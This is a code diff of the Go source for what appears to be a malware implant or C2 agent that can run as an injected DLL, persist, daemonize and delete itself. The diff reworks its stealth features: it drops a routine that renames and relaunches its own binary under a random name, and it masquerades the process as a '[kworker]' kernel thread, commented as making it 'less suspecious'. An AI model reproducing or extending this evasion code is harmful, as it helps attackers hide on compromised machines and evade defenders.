@@ -42,16 +42,8 @@ func agent_main() {
 
 	setupLogging(verbose)
 	do_not_touch_argv := is_dll || is_injected
-	renameProcessIfNeeded(persistence, do_not_touch_argv, verbose)
+	renameProcessIfNeeded(persistence, do_not_touch_argv)
 	daemonizeIfNeeded(verbose, is_dll)
-
-	if !persistence && !do_not_touch_argv {
-		// rename our agent process to make it less suspecious
-		// this does nothing in Windows
-		agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
-			util.RandInt(1, 20),
-			util.RandInt(0, 6)))
-	}
 
 	// self delete
 	self_delete := !is_dll && !is_injected && !persistence
@@ -334,6 +326,7 @@ func setupLogging(verbose bool) {
 
 func daemonizeIfNeeded(verbose, run_from_loader bool) {
 	if runtime.GOOS == "linux" && !verbose && os.Getenv("DAEMON") != "true" && !run_from_loader {
+		log.Println("Daemonizing...")
 		os.Setenv("DAEMON", "true")
 		cmd := exec.Command(os.Args[0])
 		err := cmd.Start()
@@ -344,22 +337,14 @@ func daemonizeIfNeeded(verbose, run_from_loader bool) {
 	}
 }
 
-func renameProcessIfNeeded(persistent, do_not_touch_argv, verbose bool) {
-	if len(util.FileBaseName(os.Args[0])) < 30 && !persistent && !do_not_touch_argv && !verbose && runtime.GOOS == "linux" {
-		new_name := util.RandStr(30)
-		os.Rename(os.Args[0], new_name)
-		pwd, err := os.Getwd()
-		if err != nil {
-			log.Printf("failed to get pwd: %v", err)
-		}
-		err = exec.Command(fmt.Sprintf("%s/%s", pwd, new_name), os.Args[1:]...).Start()
-		if err != nil {
-			log.Printf("failed to rename process: %v", err)
-			os.Remove(new_name)
-		} else {
-			defer os.Remove(new_name)
-			os.Exit(0)
-		}
+func renameProcessIfNeeded(persistent, do_not_touch_argv bool) {
+	if !persistent && !do_not_touch_argv && runtime.GOOS == "linux" {
+		log.Println("Renaming process...")
+		// rename our agent process to make it less suspecious
+		// this does nothing in Windows
+		agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
+			util.RandInt(1, 20),
+			util.RandInt(0, 6)))
 	}
 }
 
